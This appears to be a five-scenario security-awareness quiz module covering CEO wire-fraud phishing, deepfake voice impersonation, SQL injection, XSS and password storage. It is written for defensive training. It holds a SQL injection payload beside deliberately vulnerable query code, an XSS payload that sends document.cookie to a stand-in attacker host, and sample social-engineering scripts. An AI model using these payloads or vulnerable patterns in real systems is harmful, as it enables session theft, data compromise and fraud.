Scenario 1 of 5

🎣 Urgent Executive Wire Request (Spear-Phishing & BEC)

Social Engineering

An employee in accounts receives an email marked HIGH IMPORTANCE purportedly from the Chief Executive Officer requesting an immediate overseas wire transfer for a confidential corporate acquisition.

📧 Inbound Email Header Inspector SUSPECT SENDER DOMAIN
From: "Rahul Sharma <ceo@voiceshie1d-corp.com>"
To: "Accounts Payable <accounts@voiceshield.ai>"
Subject: URGENT: Execute Overseas Acquisition Deposit (CONFIDENTIAL)
"I am boarding a flight to London. Do not call my mobile. Wire $42,500 immediately to Account #IBAN-GB89321. Confirm via reply once dispatched."
Which key indicator confirms this is a Business Email Compromise (BEC) spear-phishing attack?

Threat Analysis: Attackers registered a typo-squatted domain substituting the letter l with numeral 1 (voiceshie1d-corp.com). They exploited social engineering authority heuristics, secrecy, and intentionally instructed the recipient not to place a phone call, eliminating verbal out-of-band confirmation.

⚠️ Potential Impact: Irreversible corporate financial loss, executive fraud liability, and breach of financial internal controls. Under IT Act Section 66D, this constitutes criminal cheating by personation.
🛡️ Prevention & Defense: Strict out-of-band verbal or dual-authorization protocol for all payments > ₹50,000; DMARC, DKIM, and SPF domain authentication; and domain-squatting monitoring.
Scenario 2 of 5

🎙️ AI Voice-Cloning CFO Impersonation (Deepfake Vishing)

VoiceShield AI Focus

A branch manager receives a WhatsApp audio call. The voice sounds identical to the Chief Financial Officer, requesting urgent one-time vendor credential release. VoiceShield AI acoustic sensors analyze the incoming stream.

📊 VoiceShield Acoustic Spectrum Inspector ACOUSTIC ANOMALIES DETECTED
Spectral Flatness: 0.42 (Elevated)
F0 Micro-Tremors: Absent (Synthetic Vocoder)
Phase Jitter: Abnormal Glottal Pattern
Background SNR: 38.4 dB (Studio Perfect)
Audio Transcript: "Hey Pradeep, I'm stuck in an audit. Need the root database API token immediately. Don't message the Slack channel, just send it here."
How should the employee verify the authenticity of this voice request?

Threat Analysis: Few-shot neural voice cloning models can clone a victim's vocal timbre with under 3 seconds of reference audio sampled from podcasts, YouTube videos, or earnings calls. However, neural vocoders frequently exhibit unnatural phase continuity and lack biological respiratory micro-tremors.

⚠️ Potential Impact: Unauthorized disclosure of root credentials, corporate espionage, and complete network takeover. Addressed under IT Act Section 43 (unauthorized access) and Section 66.
🛡️ Prevention & Defense: Zero Trust operational policy: Never transmit credentials or authorize fund transfers over phone calls; require multi-party approval and out-of-band challenge-response codes.
Scenario 3 of 5

💉 SQL Injection (SQLi) Vulnerability Awareness

Fictional Isolated Demo

A legacy product catalog search endpoint constructs database queries by dynamically concatenating untrusted user input without parameterization.

💻 Vulnerable Backend Code & Query Construction CWE-89 SQL INJECTION
// Vulnerable Python database execution pattern:
raw_input = request.form['product_name'] # Input: ' OR '1'='1' --
query = "SELECT * FROM catalog WHERE product = '" + raw_input + "';"
Resulting Executed Query:
SELECT * FROM catalog WHERE product = '' OR '1'='1' --';
Why does the injected string ' OR '1'='1' -- successfully alter the database query logic?

Threat Analysis: Direct string concatenation blurs the boundary between SQL code instructions and user data. The single quote escapes data context, altering the Abstract Syntax Tree (AST) of the query.

⚠️ Potential Impact: Full database exfiltration, unauthorized modification or deletion of records, and potential remote code execution via database extensions (e.g. xp_cmdshell).
🛡️ Prevention & Defense: Always use Parameterized Queries (Prepared Statements) or modern ORMs (such as SQLAlchemy in VoiceShield AI), which treat user input strictly as data values, never as executable code.
Scenario 4 of 5

🌐 Cross-Site Scripting (Reflected & Stored XSS) Awareness

Harmless Demonstration

A forum web application prints user search queries directly back to the HTML Document Object Model (DOM) without sanitization or contextual HTML entity encoding.

🔍 DOM Reflection Demonstration CWE-79 IMPROPER ENCODING
// Vulnerable Jinja template usage without autoescape:
<div>Search results for: {{ raw_query | safe }}</div>
User Payload: <script>fetch('https://attacker.site/steal?c=' + document.cookie)</script>
Browser receives raw unescaped script tag and executes it in the victim's session context.
Which primary defensive control protects session cookies from being accessed by client-side JavaScript in an XSS event?

Threat Analysis: When an application renders untrusted user data as HTML without sanitization, the victim's browser cannot distinguish legitimate code from injected malicious scripts, executing it with the full privileges of the victim's authenticated session.

⚠️ Potential Impact: Session hijacking, account takeover, unauthorized actions executed on behalf of the user, and defacement.
🛡️ Prevention & Defense: Context-aware output encoding (default in Jinja2), strict Content-Security-Policy (CSP) headers, and storing session tokens in HttpOnly, SameSite=Lax/Strict, and Secure cookies.
Scenario 5 of 5

🔑 Credential Stuffing & Password Storage Defenses

Authentication Security

A threat actor acquires a breach database containing 500,000 plaintext username/password pairs and configures an automated credential-stuffing tool against a corporate login portal.

🔒 Authentication Defense Comparison SECURE HASHING & MFA
Flawed Legacy Model:
• Fast unsalted MD5 / SHA-1
• Vulnerable to rainbow tables
• No login rate limiting
• Single-factor authentication only
Modern Hardened Model:
• Argon2id / PBKDF2 / bcrypt
• Unique cryptographically random salt
• Account lockout & IP rate limiting
• Phishing-resistant MFA (FIDO2 / TOTP)
Why is a cryptographically random "salt" essential when storing password hashes?

Threat Analysis: Unsalted hashes allow an attacker to compute millions of common passwords in advance (rainbow tables) or crack identical passwords across multiple user accounts simultaneously.

⚠️ Potential Impact: Mass credential compromise, unauthorized lateral movement, and compliance violations under DPDP Act 2023 Section 8 (security safeguards failure).
🛡️ Prevention & Defense: Enforce slow memory-hard hashing (Argon2id or bcrypt with work factor ≥ 12), mandate multi-factor authentication (MFA), and monitor HaveIBeenPwned breach feeds.
